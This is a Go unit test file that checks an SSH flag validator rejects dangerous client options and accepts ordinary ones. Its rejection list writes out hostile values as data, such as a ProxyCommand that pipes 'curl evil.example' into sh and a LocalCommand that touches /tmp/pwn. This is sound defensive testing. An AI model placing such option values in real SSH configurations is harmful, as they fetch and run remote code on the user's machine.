package runtime

import "testing"

// TestValidateSSHExtraFlags_RejectsDangerousOptions pins the security
// boundary against a malicious vxd.yaml that uses SSH client options
// to achieve local RCE.
func TestValidateSSHExtraFlags_RejectsDangerousOptions(t *testing.T) {
	bad := [][]string{
		{"-F", "/tmp/evil.conf"},
		{"-J", "user@bastion"},
		{"-o", "ProxyCommand=curl evil.example | sh"},
		{"-o", "proxycommand=evil"},        // case-insensitive
		{"-o", "PROXYCOMMAND=evil"},        // case-insensitive
		{"-o", "LocalCommand=touch /tmp/pwn"},
		{"-o", "PermitLocalCommand=yes"},
		{"-o", "KnownHostsCommand=/tmp/evil"},
		{"-o", "ProxyJump=evil"},
		{"-o", "Match=Host *", "-o", "ProxyCommand=evil"},
		{"-o", "Include=/etc/ssh/evil.conf"},
		// Combined -o form.
		{"-oProxyCommand=evil"},
		{"-oProxyJump=evil"},
	}
	for _, flags := range bad {
		if err := ValidateSSHExtraFlags(flags); err == nil {
			t.Errorf("expected %v rejected, got nil", flags)
		}
	}
}

// TestValidateSSHExtraFlags_AcceptsLegitimateOptions confirms the
// common operator-supplied flags still pass.
func TestValidateSSHExtraFlags_AcceptsLegitimateOptions(t *testing.T) {
	good := [][]string{
		nil,
		{},
		{"-p", "2222"},
		{"-i", "/home/op/.ssh/id_ed25519"},
		{"-4"},
		{"-6"},
		{"-T"},
		{"-v"},
		{"-q"},
		{"-C"},
		{"-o", "StrictHostKeyChecking=no"},
		{"-o", "UserKnownHostsFile=/dev/null"},
		{"-o", "ServerAliveInterval=60"},
		{"-o", "ConnectTimeout=10"},
		{"-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null"},
		{"-oStrictHostKeyChecking=no"},
	}
	for _, flags := range good {
		if err := ValidateSSHExtraFlags(flags); err != nil {
			t.Errorf("expected %v safe, got %v", flags, err)
		}
	}
}

// TestNewSSHRunner_RejectsDangerousExtraFlags verifies the constructor
// surfaces the validation error rather than constructing a runner that
// would later run a ProxyCommand on dispatch.
func TestNewSSHRunner_RejectsDangerousExtraFlags(t *testing.T) {
	_, err := NewSSHRunner(SSHConfig{
		Host:       "user@host",
		ExtraFlags: []string{"-o", "ProxyCommand=curl evil | sh"},
	})
	if err == nil {
		t.Fatal("NewSSHRunner accepted ProxyCommand ExtraFlags")
	}
}
